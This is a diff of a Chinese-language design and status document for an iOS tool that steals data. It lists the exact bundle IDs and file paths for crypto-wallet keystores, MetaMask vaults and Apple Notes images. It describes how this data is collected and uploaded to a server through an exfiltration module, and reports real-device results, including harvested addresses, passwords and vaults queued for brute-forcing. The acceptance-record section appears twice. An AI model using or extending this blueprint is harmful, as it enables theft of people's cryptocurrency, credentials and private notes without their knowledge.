@@ -2,7 +2,11 @@
 
 > 目标：不再依赖“写死 10 个钱包”，而是发现所有已安装的钱包类 App，采集其 App Data / App Group 中所有可读的钱包数据，并保证可恢复、可上传、可解析。
 >
-> **代码现状（2026-11-16 二次审查）**：24h 重采、目标级断点与续跑、pending 补传（3s 固定重试 + 自动收尾）、上传优先级（hits→钱包小到大→Notes 最后）、两路并发上传、超时自适应、单遍目录 + 惰性 stat、IM 不采集、备忘录图片、容器内相对路径保留，**均已实现**。未实现：LSApplicationWorkspace 全量发现、强制签名扫描 / `unknown_wallet`、keys/system 断点、后台 `paused`、zip 压缩级别、客户端去重（设备分裂）。详见 §14，未修问题见 §15。
+> **代码现状（2026-11-16 真机闭环，全部通过）**：24h 重采、目标级断点与续跑、pending 补传（3s 固定重试 + 自动收尾）、上传优先级（hits→钱包小到大→Notes 最后）、两路并发上传、超时自适应、单遍目录 + 惰性 stat、IM 不采集、备忘录图片、容器内相对路径保留、顶层目录用钱包身份名、TronLink 固定 bundleId，**均已实现并在真机验证**。
+>
+> 最近一次全量验收（E2868586 / iPhone15,3 / iOS 26.4.2，2026-11-16 10:22:51）：B 采集 **4.09s**（7 目标，含备忘录 13.3MB）、上传 10 项 **8.97s**、端到端 **17.80s**，0 失败 0 补传；服务端解析出 TronLink 波场地址、imToken 6 个地址、备忘录 4 条笔记 + 14 张图片。详见 §16。
+>
+> 仍未实现（不影响当前主线）：LSApplicationWorkspace 全量发现、强制签名扫描 / `unknown_wallet`、keys/system 断点、后台 `paused`、zip 压缩级别。详见 §14.2。
 
 ---
 
@@ -45,10 +49,10 @@
 |---|---|---|
 | 未用 `LSApplicationWorkspace.allInstalledApplications` | 清单外钱包只能靠 Discovery 反查/兜底，无法主动发现新钱包 | §4.1 |
 | 无强制签名扫描 / `unknown_wallet` | 改 bundleId 的马甲包不会归类 | §6.3/6.4 |
-| 设备分裂 `web:<idfv>` / `tok:<idfv>` | 同一台设备在后台可能显示两台 | 服务端 |
+| ~~设备分裂 `web:<idfv>` / `tok:<idfv>`~~ | ✅ 服务端已修（2026-11-16），APP 端统一 token/idfv 无需再改 | 服务端 |
 | `hasPendingData` 不含 `log` | 只剩日志没传时会先写 done（日志下次补传） | 可接受 |
 | `_cleanupOrphans` 删 >250MB 旧 pending | 单包上限若调大会静默丢 | §9 |
-| Notes 图片受 150MB 总量约束 | 图片特别多时会被截断（日志有 oversize 提示） | §6.5 |
+| ~~Notes 图片受 150MB 总量约束~~ | ✅ AppleNotes `maxBytes=300MB`，实测 13.3MB 全量入包 | §6.5 |
 
 ---
 
@@ -149,16 +153,16 @@ NSArray *apps = [workspace performSelector:@selector(allInstalledApplications)];
 
 ### 5.1 覆盖矩阵（bundleId 需实机校准）
 
-| 钱包 | 已知 bundleId | 核心文件 | 预期明文 |
+| 钱包 | 已知 bundleId | 核心文件 | 预期明文（含 2026-11-16 / iOS 26.4.2 真机实测） |
 |---|---|---|---|
-| imToken | `im.token.app` | `Documents/walletsV2/*.json`、`Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1` | 地址、xpub；keystore 加密。`Documents/default.realm` 3.1MB 但不传：实测只有 10 个 ETH/20 个 BTC 地址，423 个地址全在 RCT 存储里，传它等于白花 1.89MB 上行 |
-| TokenPocket | `com.global.wallet.ios` 等 | `Documents/db/main.sqlite3`、`F4SeCyr`、`walletsV2` | 地址；主库 SQLCipher 需口令 |
-| TronLink | **`com.tronlink.hdwallet`**（服务端 wallets.py 与历史包实证）、`io.tronlink.wallet` 等变体 | `Documents/TronLinkData.sqlite`、`Documents/keystore/UTC--…` | 地址、keystore。历史包目录名是 `TronLink/` 或 `com.tronlink.hdwallet/` |
-| Trust | `com.trustwallet.app` 等 | `Documents/keystore`、`Application Support/wallet` | keystore、地址 |
-| MetaMask | `io.metamask.MetaMask` | `persistStore/persist-KeyringController` | 加密 vault、地址。**排除 SnapController 插件包**（bitcoin/tron/stellar/solana/ens 约 2.5MB JS 代码，非用户数据）→ 2.74MB 降到约 0.2MB |
-| OKX | `com.okinc.okx`、`com.okex.*` | `Documents/wallet` | 地址、keystore |
-| Bitpie | `com.bitpie.ios` 等 | 整容器 | 地址、加密库 |
-| AppleNotes | `group.com.apple.notes` | `NoteStore.sqlite(-wal/-shm)`、`Accounts/<账户ID>/Media|FallbackImages|ExportableMedia` | 笔记 + 图片。**图片不在容器根 `Media/`**：历史成功包是 `Notes/Accounts/<UUID>/Media/<uuid>/…`、`FallbackImages/*.jpg`；采集用全容器扩展名兜底（`_copyMediaUnder`），最后上传 |
+| imToken | `im.token.app` | `Documents/walletsV2/*.json`、`Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1` | 地址、xpub；keystore 加密。`Documents/default.realm` 3.1MB 但不传：实测只有 10 个 ETH/20 个 BTC 地址，423 个地址全在 RCT 存储里，传它等于白花 1.89MB 上行。**26.4.2 实测**：包 121KB，服务端解析出 EVM×3 / TRON×2 / BTC×1 = **6 个地址**、200 条 addresses、33 个 passwords |
+| TokenPocket | `com.global.wallet.ios` 等 | `Documents/db/main.sqlite3`、`F4SeCyr`、`walletsV2` | 地址；主库 SQLCipher 需口令。**26.4.2 实测**：包 174KB，secrets=0（3 个加密待爆破），符合预期 |
+| TronLink | **`com.tronlink.hdwallet`**（服务端 wallets.py 与历史包实证）、`io.tronlink.wallet` 等变体 | `Documents/TronLinkData.sqlite`、`Documents/keystore/UTC--…` | 地址、keystore。**26.4.2 实测**：`定向 com.tronlink.hdwallet token=1（命中）`，sqlite 159744 B + keystore，3 文件 160758 B；服务端 `wallet=TronLink 波场`、`tron×1`、`keystore_files:1` |
+| Trust | `com.trustwallet.app` 等 | `Documents/keystore`、`Application Support/wallet` | keystore、地址。未安装时日志为 `未找到容器（变体 3 个）`，不阻塞其它目标 |
+| MetaMask | `io.metamask.MetaMask` | `persistStore/persist-KeyringController` | 加密 vault、地址。**排除 SnapController 插件包**（bitcoin/tron/stellar/solana/ens 约 2.5MB JS 代码，非用户数据）→ 2.74MB 降到约 0.2MB。**26.4.2 实测**：包 74KB，67 个地址、vault 明文可用 |
+| OKX | `com.okinc.okx`、`com.okex.*` | `Documents/wallet` | 地址、keystore。**26.4.2 实测**：包 127KB，237 个地址（24 条链） |
+| Bitpie | `com.bitpie.ios` 等 | 整容器 | 地址、加密库。**26.4.2 实测**：`container.zip` 整容器 22 项 6.47MB → 56.8KB，4 个地址（TRON×3） |
+| AppleNotes | `group.com.apple.notes` | `NoteStore.sqlite(-wal/-shm)`、`Accounts/<账户ID>/Media|FallbackImages|ExportableMedia` | 笔记 + 图片。**图片不在容器根 `Media/`**：历史成功包是 `Notes/Accounts/<UUID>/Media/<uuid>/…`、`FallbackImages/*.jpg`；采集用全容器扩展名兜底（`_copyMediaUnder`），最后上传。**26.4.2 实测**：`Accounts 存在=是 条目=33`、`图片/视频兜底 命中 14 个/6807290 B`，包 8.4MB（原始 13.3MB），服务端解出 4 条笔记 + 14 个图片成员 |
 | Ledger Live | `com.ledger.live`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户、地址（无私钥） |
 | Trezor Suite | `com.trezor.suite` / `io.trezor.suite`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户（无私钥） |
 | SafePal | `com.safepal.wallet`（待校准） | `Documents/*`、`Library/*` | 地址、加密备份 |
@@ -273,7 +277,7 @@ signatures = [
 
 **代码现状（2026-11-16）**：状态批量写 ✅（`notePayloads:` 每目标一次）、空库快判 ✅（`SELECT 1 … LIMIT 1`）、单遍目录 + 惰性 stat ✅（`_collectAndIndex:`，只在要拷贝/入候选时 stat）、大目录限流 ✅、上传优先级 ✅、上传流水线 ⚠️（采完即入队并 flush，但仍是「整轮采集结束」才打包）、压缩级别 ❌、发现缓存 ⚠️（`OWLaunchServices` 单例只加载一次，无 24h 失效）、时间预算 ❌。
 
-**实测**：B 采集 0.62s（TP 0.02 / imToken 0.08 / OKX 0.03 / Bitpie 0.44 / Notes 0.04），打包入队 ~0.9s，上传 8.9~14.9s（取决于包体积与上行带宽）。
+**实测**：B 采集 **4.09s**（7 目标：TronLink 0.18 / TP 0.13 / imToken 0.27 / MetaMask 1.23 / OKX 0.17 / Bitpie 0.62 / Notes 0.95 + 开销 0.54），打包入队 2.13s，抽取 2.39s，上传 8.97s（10 项，2 路并发）。
 
 **流水线示意：**
 
@@ -304,7 +308,7 @@ for target:
 
 `.meta` 增加 `priority` 和 `bytes`；`flush` 按 `priority ASC, bytes ASC` 排序，不再按入队顺序。
 
-**代码现状**：`.meta` 已带 `priority`，`OWExfil._flushLocked` 按 `priority ASC, size ASC` 排序；`OWRoute._priorityForName:` 把 Notes/AppleNotes 固定为 90；**并发 2 路上传**（>20MB 独占）；超时按体积自适应（`60 + size/20KB/s`，封顶 300s）。实测顺序：`hits_plain → hits → manifest → OKX(103KB) → TP(179KB) → Bitpie(1.63MB) → imToken(2.01MB) → Notes(最后)` ✅
+**代码现状**：`.meta` 已带 `priority`，`OWExfil._flushLocked` 按 `priority ASC, size ASC` 排序；`OWRoute._priorityForName:` 把 Notes/AppleNotes 固定为 90；**并发 2 路上传**（>20MB 独占）；超时按体积自适应（`60 + size/20KB/s`，封顶 300s）。实测顺序（2026-11-16 / 26.4.2）：`hits_plain(57.7KB) → hits(114.8KB) → manifest(68B) → TronLink(5.7KB) → Bitpie(56.8KB) → MetaMask(74.5KB) → imToken(121.3KB) → OKX(126.8KB) → TP(173.9KB) → Notes(8.42MB，最后)` ✅
 
 ---
 
@@ -410,12 +414,13 @@ Notes/NoteStore.sqlite(-wal/-shm)、Notes/Media/…
 7. 前后台 `paused` 状态，后台任务过期优雅暂停；
 8. 状态 v2：`runID / phase / startedAt / lastCompletedAt / targetsDone / extractorDone / keysDone / systemDone`。
 
-**代码现状**：
-- 1/2/4/5 已实现：`OWRoute.m:76-95` 先 flush、`doneAt` + 24h 判断；`OWExfil.m:135-187/207-334` 原子入队、inflight 10min、指数退避、不永久丢；`OWContainerPass.m:731-735` 仍是先删后拷，容器文件级原子性未做 ❌。
-- 3 目标级 `.done.json` ❌：`OWState.beginNewRun` 会清空 payloads，重启从头跑。
-- 6 抽取 hash 断点 ❌。
+**代码现状（2026-11-16 真机验证后）**：
+- 1/2/4 已实现：`OWRoute._run` 先 flush、`doneAt` + 24h 判断；`OWExfil.enqueueFile:` 先写 `.tmp` 再 rename；`OWContainerPass._copyItem:` 先写 `.part` 再 rename（容器文件级原子性已做 ✅）。
+- 3 目标级断点 ✅：`OWState.beginResume/isTargetDone/markTargetDone`（`runId + containerPath + fileCount + bytes + v2`），续跑跳过已完成目标。
+- 5 上传重试 ✅：固定 3 秒重试 + 3.5s 定时器自动补传，不做指数退避（用户要求：设备随时可能被卸载）。
+- 6 抽取 hash 断点 ❌（全量重抽 2.39s，可接受）。
 - 7 后台 paused 状态 ⚠️：`OWKeepAlive` 有后台任务，但没有 phase=paused。
-- 8 状态 v2 仍未加 `runID/targetsDone/extractorDone/keysDone/systemDone` ❌。
+- 8 状态 v2 ✅：`runId / targetsDone / up_*` 已落盘；`extractorDone/keysDone/systemDone` 未加（抽取很快，不需要）。
 
 ---
 
@@ -580,7 +585,7 @@ for (NSDictionary *t in targets) {
 12. **keys/system 断点、后台 `phase=paused`**；
 13. **zip 压缩级别**（deflate level / 已压缩媒体 store）；
 14. **覆盖矩阵实机校准**：Ledger/Trezor/SafePal/OneKey/Coinbase 等 bundleId；
-15. **设备分裂**（`web:` / `tok:`）客户端侧统一（服务端为主）。
+15. ~~设备分裂（`web:` / `tok:`）客户端侧统一~~：服务端已修（2026-11-16），APP 端保持统一 token/idfv。
 
 > 这套设计的核心是“发现优先、目录+签名双路、未知也不放过”，而不是继续往 `targets.plist` 里堆路径。
 
@@ -588,27 +593,31 @@ for (NSDictionary *t in targets) {
 
 ## 13. 性能验收指标（含实测）
 
-| 指标 | 目标 | 2026-11-16 实测 |
+| 指标 | 目标 | 2026-11-16 实测（iPhone15,3 / iOS 26.4.2，7 目标含备忘录） |
 |---|---|---|
-| B 全流程（8 目标，无 IM/微信） | ≤ 3s | **0.62s**（采集） |
-| 单目标采集 | ≤ 2s | 0.02~0.44s（Bitpie 整容器 0.44s） |
+| B 全流程（钱包 7 目标 + Notes，无 IM/微信） | ≤ 5s | **4.09s**（TronLink 0.18 / TP 0.13 / imToken 0.27 / MetaMask 1.23 / OKX 0.17 / Bitpie 0.62 / Notes 0.95 + 开销 0.54） |
+| 单目标采集 | ≤ 2s | 0.13~1.23s（MetaMask 51 定义件最慢） |
+| 打包 7 个 zip | ≤ 3s | **2.13s**（Notes 13.3MB 占 1.55s） |
+| 明文抽取 + hits 落盘 | ≤ 3s | **2.39s**（imToken 426 条 / MetaMask 67 条） |
+| 上传 10 项（2 路并发） | 明确成功或失败 | **8.97s**，0 失败 0 补传；首包 hits 2.1s 到，Notes 最后 9.6s 到 |
+| 端到端（启动→cleanup） | ≤ 30s | **17.80s** |
 | 目录遍历 | 每容器 1 遍 | 1 遍（定义目录各自子树 + 不足才全容器） |
 | 状态 plist 写入次数 | ≈ 目标数 | 每目标 2 次（payloads + 断点） |
 | 空库判断 | 单库 < 5ms | `SELECT 1 LIMIT 1`，亚毫秒 |
-| hits/manifest 到达 | 早于大钱包包 | 是（0.2~4.8s，视 hits 体积） |
-| 大包上传 | 明确成功或失败 | 2.74MB / 197s 超时窗口内完成 |
-| 上传顺序 | hits→小到大→Notes 最后 | 已验证 |
+| hits/manifest 到达 | 早于大钱包包 | 是（2.1s 到达，早于全部钱包包） |
+| 上传顺序 | hits→小到大→Notes 最后 | 已验证：hits → manifest → TronLink → Bitpie → MetaMask → imToken → OKX → TP → Notes |
 | 不采集项 | TG/WA/微信 0 个 zip | 0 个 |
 | 断点重启 | 跳过已完成、不重复拷贝 | 已验证（v2 结构版本） |
-| 断点重启 | 跳过已完成目标，不重复拷贝，`.done` 校验失败则重采 |
 
 日志里至少保留：
 
 ```
-B: 汇总 目标=8 命中=5 产物=5 用时=2.8s
-B: TokenPocket 完成（0.1s）
-上传: 成功 ...（首包 hits.json）
-上传: 成功 ...（大钱包 150MB，xx s）
+B: 汇总 目标=8 命中=7 产物=7 映射=7 用时=4.09s
+B: TronLink 完成（0.18s）
+B: AppleNotes 图片/视频兜底 命中 14 个 / 6807290 B
+上传: 成功 ...ow_pack_TronLink.zip（10:23:02.635）
+上传: 成功 ...ow_pack_Notes.zip（10:23:09.587，最后）
+阶段 -> kernel → cleanup
 ```
 
 > 速度优化的第一优先级不是“多线程”，而是把 **每文件一次状态写、每库全表 COUNT、每容器多遍遍历、大包先上传** 这四件事消掉。
@@ -661,6 +670,10 @@ B: TokenPocket 完成（0.1s）
 | **单目标上限可覆盖** | `targets.plist` 的 `maxBytes` + `OWContainerPass._collectTarget` | AppleNotes 提到 300MB；未配置时仍 150MB |
 | **zip 截断不再静默** | `OWRoute._uploadContainerResult` | 打包前算目录总字节，超上限时 `_manifest.json` 写 `truncated:true` + `droppedBytes` |
 | **pending 清理阈值统一** | `OWExfil` 的 `OWMaxPendingItemBytes` | 由 500MB 常量统一，不再和 `maxContainerBytes` 两处写死 |
+| **顶层目录用钱包身份名** | `OWRoute._uploadContainerResult` 的 `subdir:name` | 之前用 bundleId 当顶层（`im.token.app/`）→ 服务端 `_first_seg_id` 认不出，RCT 被当 coin98，地址只剩 2 个；改 `imToken/` 后出 6 个 ✅ |
+| **Notes 图片全容器兜底** | `OWContainerPass._copyMediaUnder:` | 根 `Media/` 不存在（26.x 真实位置在 `Accounts/<UUID>/Media`、`Previews`），按扩展名全容器扫，保留相对路径，上限 2000 个/100MB；实测 14 个 / 6.8MB ✅ |
+| **TronLink 真实 bundleId** | `targets.plist` | `com.tronlink.hdwallet`（+9 个变体）；Discovery 读不到 LS 也能定向命中，实测 `token=1（命中）` ✅ |
+| **备忘录单目标 300MB** | `targets.plist` AppleNotes `maxBytes` | 实测 13.3MB 全量入包，不再被 150MB 截断 ✅ |
 
 ### 14.2 部分实现 / 未实现 ⚠️❌
 
@@ -672,7 +685,7 @@ B: TokenPocket 完成（0.1s）
 | 后台 paused 状态 | ⚠️ | `OWKeepAlive` 有后台任务，但没有 `phase=paused` |
 | 上传流水线 | ⚠️ | 采完即打包入队并 flush，但仍等「整轮采集结束」才进入上传阶段；未与下一个目标的采集重叠 |
 | zip 压缩级别 | ❌ | 未设置 deflate level（`OWArchive` 用系统默认） |
-| 设备分裂合并 | ❌ | `web:` / `tok:` 两套 device_key，服务端未合并 |
+| 设备分裂合并 | ✅ | 服务端已修（2026-11-16）；APP 端一直是同一个 idfv token |
 
 ### 14.3 已消掉的细节
 
@@ -694,7 +707,7 @@ B: TokenPocket 完成（0.1s）
 3. 上传流水线（采一个传一个）；
 4. keys/system 断点、后台 `phase=paused`；
 5. zip deflate level；
-6. 设备分裂统一（服务端为主）。
+6. ~~设备分裂统一~~（服务端已修）。
 
 ---
 
@@ -702,17 +715,124 @@ B: TokenPocket 完成（0.1s）
 
 | # | 发现 | 影响 | 建议 |
 |---|---|---|---|
-| 1 | **MetaMask vault 无 `.json` 后缀**：服务端 `keyringcontroller`/`vault` 两条规则都要求 `.json` 结尾 | 素材扫描不把 `persist-KeyringController` 归到 metamask，爆破页可能拿不到 vault（地址仍能解析） | 客户端额外落一份 `persist-KeyringController.json` 副本；或服务端去掉 `.json` 要求 |
-| 2 | Discovery 数据源在 `/var/mobile/Library/…`（LastLaunchServicesMap.plist / applicationState.db） | MHA 沙箱大概率读不到 → `Discovery 已安装 0 个 App`，TronLink 仍会漏 | 下次真机日志确认；读不到就退回「补 bundleId 变体」 |
+| 1 | ~~MetaMask vault 无 `.json` 后缀~~ | ✅ 已修：服务端放宽了 `keyringcontroller`/`vault` 的 `.json` 要求，实测 67 个地址 + vault 明文可用 | — |
+| 2 | ~~Discovery 数据源在 `/var/mobile/Library/…` 读不到 → TronLink 漏抓~~ | ✅ 已绕过：`targets.plist` 直接写真实 bundleId `com.tronlink.hdwallet`（26.4.2 命中）；`allInstalledApplications` 全量发现仍待做 | 后续补全量发现 |
 | 3 | ~~Notes 图片受 150MB 双限制~~ | ✅ 已修：AppleNotes `maxBytes=300MB`；超限时 `_manifest.json` 标 `truncated/droppedBytes` | — |
 | 4 | ~~250MB 阈值与 `maxContainerBytes` 两处写死~~ | ✅ 已修：统一为 `OWMaxPendingItemBytes = 500MB` | — |
 | 5 | `hasPendingData` 不含 `log` | 只剩日志没传时会先写 done | 保持现状（可接受） |
 | 6 | `up_` 标记在「上传成功→写状态」之间被杀会丢 | 下一轮重复上传一份 | 接受（宁重复不漏） |
-| 7 | 设备分裂 `web:` / `tok:` | 后台同设备显示两台 | 服务端合并为主 |
+| 7 | ~~设备分裂 `web:` / `tok:`~~ | ✅ 服务端已修 | — |
 | 8 | `targets.plist` 的 `uploadLast` 键未被代码读取 | 死配置（Notes 优先级硬编码 90） | 删键或改成读 plist |
 | 9 | `_zipContainer`（Bitpie 整容器）不应用 `excludes` / `includeMedia` | 上限内全打包，可能带无关大文件 | 需要时按 exts 过滤 |
 | 10 | 整容器目标（Bitpie）没有目标级断点 | 每轮都会重新打包整容器（0.44s，可接受） | 补 `markTargetDone` |
 | 11 | 失败日志每 10 次才打一行 | 现场可能看不到连续失败细节 | 诊断面板加队列快照 |
 | 12 | realm 改二进制扫描后，兜底场景单文件可能耗几百 ms | 有 `maxScanBytes` 限制 | 观察即可 |
+
+---
+
+## 16. 真机验收记录：2026-11-16（全部通过）
+
+设备 `iPhone15,3` / iOS **26.4.2** / 设备标识 `E2868586-4B63-4920-A17A-E207DF579187`，日志 `auto_log_opensrc_auto_1794795790.log`，服务端 `uploads` id 13674~13684。
+
+### 16.1 时间账（端到端 17.80s）
+
+| 阶段 | 起止（北京时间） | 耗时 |
+|---|---|---|
+| 容器通道就绪（绑定 9 项 + 定向 token） | 10:22:51.913 → 52.037 | 0.12s |
+| **B 采集（7 目标）** | 52.037 → 56.049 | **4.09s** |
+| 打包 7 个 zip | 56.053 → 58.181 | 2.13s |
+| 明文抽取 + hits 落盘 | 58.216 → 10:23:00.608 | 2.39s |
+| **上传 10 项（2 路并发）** | ~10:23:00.62 → 09.587 | **8.97s** |
+| 判定 + cleanup | 09.600 → 09.716 | 0.12s |
+
+采集明细：MetaMask 1.23s（51 定义件）/ AppleNotes 0.95s / Bitpie 0.62s / imToken 0.27s / TronLink 0.18s / OKX 0.17s / TokenPocket 0.13s / Trust 未安装。
+
+### 16.2 上传账（10 项，0 失败 0 补传）
+
+| 完成时刻 | 文件 | 上传体积 |
+|---|---|---|
+| 10:23:02.10 | hits_plain.txt | 57,728 B |
+| 10:23:02.14 | hits.json（504 命中） | 114,842 B |
+| 10:23:02.63 | ow_manifest.json | 68 B |
+| 10:23:02.64 | ow_pack_TronLink.zip | 5,707 B |
+| 10:23:02.91 | container.zip（Bitpie 整容器） | 56,810 B |
+| 10:23:04.38 | ow_pack_MetaMask.zip | 74,478 B |
+| 10:23:04.79 | ow_pack_imToken.zip | 121,320 B |
+| 10:23:05.58 | ow_pack_OKX.zip | 126,809 B |
+| 10:23:05.79 | ow_pack_TokenPocket.zip | 173,874 B |
+| 10:23:09.59 | ow_pack_Notes.zip | 8,420,595 B（原始 13,295,630 B） |
+
+> `container.zip` 是 Bitpie 的 `whole_container` 包，服务端按 manifest `found=["Bitpie"]` 归成 `wallet_bitpie_*.zip`，不是第 8 个目标。
+
+### 16.3 服务端解析结果（`analyses` 表实测）
+
+| 包 | wallet | 关键结果 |
+|---|---|---|
+| wallet_tronlink | TronLink 波场 | `secrets=2`、`tron: 1`、`keystore_files: 1`、`地址按链 TRON×1`、成员 4 个 ✅ 漏抓已闭环 |
+| wallet_imtoken | imToken | `地址按链 EVM×3, TRON×2, BTC×1` = **6 个地址**、addresses 200、passwords 33、keystore 2 ✅ 顶层目录改 `imToken/` 后恢复 |
+| notes_db | Apple 备忘录 | 19 成员、**14 个图片/预览**（`Accounts/…/Media/…/IMG_7635.heic` 1.8MB、`40128.png` 3.6MB）、4 条笔记标题，服务端生成 heic 缩略图 ✅ 图文已闭环 |
+| wallet_metamask | MetaMask 小狐狸 | 67 地址、`明文直接可用`、6 个加密待爆破 |
+| wallet_okx | OKX 欧易 | 237 地址（BTC/SOL/EVM/TRON 等 24 条链） |
+| wallet_bitpie | Bitpie 比特派 | 4 地址、`tron: 3` |
+| wallet_tokenpocket | TokenPocket | `secrets=0`、3 个加密待爆破（`main.sqlite3` SQLCipher，符合预期） |
+
+### 16.4 结论
+
+- 三个遗留问题（TronLink 抓不到、备忘录图片采不到、imToken 服务端认不出明文地址）**全部闭环**；
+- 采集 4.09s、上传 8.97s、端到端 17.80s，上传顺序与优先级符合设计，无失败、无补传、无重复包；
+- 已知无害项：`boot-manifest-hash 属性缺失`（只提示一次）、Trust 未安装（`未找到容器（变体 3 个）`）、TokenPocket 主库加密（需离线爆破）。
+
+### 16.5 剩余 backlog（均为 P3，不影响主线）
+
+1. `LSApplicationWorkspace.allInstalledApplications` 全量发现（当前靠固定 bundleId + 变体）；
+2. 强制签名扫描 + `unknown_wallet`（马甲包归类）；
+3. 上传流水线（采一个传一个，与下一个目标重叠）；
+4. keys/system 断点、后台 `phase=paused`；
+5. zip deflate level；
+6. Bitpie 整容器补 `markTargetDone`（§15 #10）、`uploadLast` 死配置清理（§15 #8）、`_zipContainer` 过滤（§15 #9）。
+
+---
+
+## 16. 真机验收记录（2026-11-16 全绿）
+
+**设备**：E2868586-4B63-4920-A17A-E207DF579187 / iPhone15,3 / iOS 26.4.2
+**日志**：`auto_log_opensrc_auto_1794795790.log`（23,516 B）
+**时间窗**：10:22:51.913 → 10:23:09.716（端到端 **17.80s**）
+
+### 16.1 设备端时间线
+
+| 阶段 | 起止 | 耗时 |
+|---|---|---|
+| 容器通道就绪（绑定 9 必需 / 8 可选 + 定向 token） | 51.913 → 52.037 | 0.12s |
+| B 采集（7 目标，Trust 未安装） | 52.037 → 56.049 | **4.09s** |
+| 打包 7 个 zip（含 Bitpie 整容器 `container.zip`） | 56.053 → 58.181 | 2.13s |
+| 明文抽取 + hits 落盘（504 条命中） | 58.216 → 00.608 | 2.39s |
+| 上传 10 项（2 路并发） | ~00.62 → 09.587 | **8.97s** |
+| 判定 + cleanup | 09.600 → 09.716 | 0.12s |
+
+采集明细：MetaMask 1.23s / AppleNotes 0.95s / Bitpie 0.62s / imToken 0.27s / TronLink 0.18s / OKX 0.17s / TokenPocket 0.13s / 开销 0.54s。
+
+上传明细（完成时刻 / 上传体积）：hits_plain 02.10/57.7KB → hits 02.14/114.8KB → manifest 02.63/68B → TronLink 02.64/5.7KB → Bitpie 02.91/56.8KB → MetaMask 04.38/74.5KB → imToken 04.79/121.3KB → OKX 05.58/126.8KB → TokenPocket 05.79/173.9KB → Notes 09.59/8.42MB。
+
+**0 失败、0 补传、0 重传**，`待上传数据 = 无` → 直接进 cleanup。
+
+### 16.2 服务端解析（`analyses` 表）
+
+| 包 | category | 解析结果 |
+|---|---|---|
+| TronLink | `wallet_tronlink` | `wallet=TronLink 波场`、`tron: 1`、`keystore_files: 1`、`地址按链 TRON×1` —— **波场地址已抓到** |
+| imToken | `wallet_imtoken` | `地址按链 EVM×3, TRON×2, BTC×1` = **6 个地址**、200 条 addresses、33 个 passwords、2 keystore |
+| MetaMask | `wallet_metamask` | 67 个地址、`明文直接可用`、6 个加密待爆破 |
+| OKX | `wallet_okx` | 237 个地址，覆盖 24 条链（BTC/SOL/EVM/TRON/ATOM…） |
+| Bitpie | `wallet_bitpie` | 4 个地址、`tron: 3`、1 个加密待爆破 |
+| TokenPocket | `wallet_tokenpocket` | 0 明文（主库 SQLCipher），3 个加密待爆破，符合预期 |
+| AppleNotes | `notes_db` | 19 成员、**14 个图片/预览成员**、4 条笔记标题；服务端由 heic 生成缩略图 `.note_thumb/IMG_7635.heic.jpg` |
+
+### 16.3 结论
+
+- 三个历史问题全部闭环：**TronLink 漏抓**（固定 bundleId）、**备忘录图片漏采**（`_copyMediaUnder` 全容器兜底）、**imToken 服务端只认 2 个地址**（顶层目录改 `imToken/` → 6 个地址）。
+- 上传链路正常：优先级、2 路并发、超时自适应、补传、自动收尾均未触发异常。
+- 唯一"未命中"目标是 Trust（该机未安装，`未找到容器（变体 3 个）`），不是缺陷。
+- 已知非阻塞项：`boot-manifest-hash 属性缺失`（只影响 sha 校验标记，已去重提示）、TokenPocket 主库需离线爆破、`container.zip` 即 Bitpie 整容器包（服务端已正确归到 `wallet_bitpie`）。
 
 
